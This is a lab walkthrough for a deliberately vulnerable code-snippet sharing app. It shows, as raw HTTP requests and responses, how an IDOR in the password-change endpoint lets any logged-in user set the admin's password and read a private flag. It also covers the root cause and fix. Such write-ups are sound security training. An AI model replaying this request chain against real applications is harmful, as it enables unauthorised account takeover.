# copypasta-004 - BugForge Lab Walkthrough

**URL:** https://lab-1782929419230-x3nslm.labs-app.bugforge.io/  
**Difficulty:** Easy  
**Vulnerability:** IDOR - Password Reset Body Injection → Account Takeover  
**Flag:** `bug{ynERtSzO7HKwxnbmu49g9bfBWl7cpWck}`

---

## Summary

CopyPasta is a code-snippet sharing SaaS. The `PUT /api/profile/password` endpoint accepts a `user_id` field in the JSON body and uses it to determine whose password to update - instead of deriving the user from the authenticated JWT. Any logged-in user can overwrite any account's password by supplying a different `user_id`, then log in as that account. Targeting `user_id: 1` (admin) grants access to a private snippet containing the flag.

## Tech Stack

- React SPA (CRA), JWT in localStorage
- Express.js (Node.js), SQLite
- JWT auth (`Authorization: Bearer`)
- Multi-user snippet/profile management

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Fields: `username`, `email`, `password` |
| `/api/login` | POST | No | Returns JWT |
| `/api/verify-token` | GET | JWT | Returns authenticated user object |
| `/api/profile/:username` | GET | JWT | Returns user info + public snippets |
| `/api/profile` | PUT | JWT | Update profile fields |
| `/api/profile/password` | PUT | JWT | **Vulnerable** - updates password by body `user_id` |
| `/api/snippets` | GET | JWT | Returns own snippets (public + private) |
| `/api/snippets/public` | GET | JWT | Public snippet feed (leaks usernames + IDs) |

## Vulnerability

`PUT /api/profile/password` takes `user_id` from the request body and uses it as the target of the password update. The authenticated user's identity (from the JWT) is never checked against the supplied `user_id`:

```javascript
// What the server does (vulnerable)
UPDATE users SET password = ? WHERE id = req.body.user_id

// What it should do
UPDATE users SET password = ? WHERE id = req.user.id  // derived from JWT
```

This is a classic IDOR: the authorization check is missing entirely on the sensitive write operation. Any authenticated user can reset any other user's password.

## Attack Chain

### Step 1 - Register an attacker account

```
POST /api/register HTTP/1.1
Host: lab-1782929419230-x3nslm.labs-app.bugforge.io
Content-Type: application/json

{"username":"attacker1","email":"attacker1@test.com","password":"Password123!"}
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {"id": 6, "username": "attacker1", "role": "user"}
}
```

### Step 2 - Identify admin via public snippet feed

```
GET /api/snippets/public HTTP/1.1
Authorization: Bearer <attacker_token>
```

Response includes snippets authored by `user_id: 1, username: "admin"`. Confirmed by `GET /api/profile/admin`:

```json
{"user": {"id": 1, "username": "admin", "email": "admin@copypasta.com", "role": "admin"}}
```

### Step 3 - Overwrite admin's password using IDOR

```
PUT /api/profile/password HTTP/1.1
Host: lab-1782929419230-x3nslm.labs-app.bugforge.io
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"password":"PwnedAdmin123!","user_id":1}
```

Response:
```json
{"message": "Password updated successfully"}
```

### Step 4 - Login as admin

```
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"PwnedAdmin123!"}
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {"id": 1, "username": "admin", "role": "admin"}
}
```

### Step 5 - Retrieve flag from admin's private snippet

```
GET /api/snippets HTTP/1.1
Authorization: Bearer <admin_token>
```

Response includes a private snippet (`is_public: 0`) not visible to other users:

```json
{
  "id": 10,
  "title": "bug{ynERtSzO7HKwxnbmu49g9bfBWl7cpWck}",
  "code": "Great job finding the broken password reset",
  "description": "You successfully exploited the insecure password reset functionality",
  "is_public": 0
}
```

## Discovery Notes

- JS bundle analysis revealed `PUT /api/profile/password` sends `{password, user_id}` - `user_id` in the body on a write endpoint is an immediate IDOR signal
- `/api/snippets/public` leaked all author usernames and `user_id` values without auth bypass, identifying admin as `user_id: 1`

## Dead Ends

| Attempt | Why it failed | Lesson |
|---------|--------------|--------|
| SQLi on login | Parameterized queries | Expected on modern Express apps |
| Mass assignment `role:admin` on register | Field ignored | Server-side role assignment |
| IDOR on `/api/snippets/:id` (admin's private snippet directly) | "Snippet not found" | Private snippets filtered by ownership on read - need to own the account |

## Root Cause

The password update handler extracts the target `user_id` from `req.body` instead of `req.user` (the JWT payload). The fix is one line: replace `req.body.user_id` with the identity extracted from the verified token.

## CWE / OWASP

- **CWE-639**: Authorization Bypass Through User-Controlled Key
- **CWE-284**: Improper Access Control
- **OWASP A01:2021** - Broken Access Control (IDOR on sensitive write)
- **Impact:** Full account takeover of any user including admin, exposing all private data
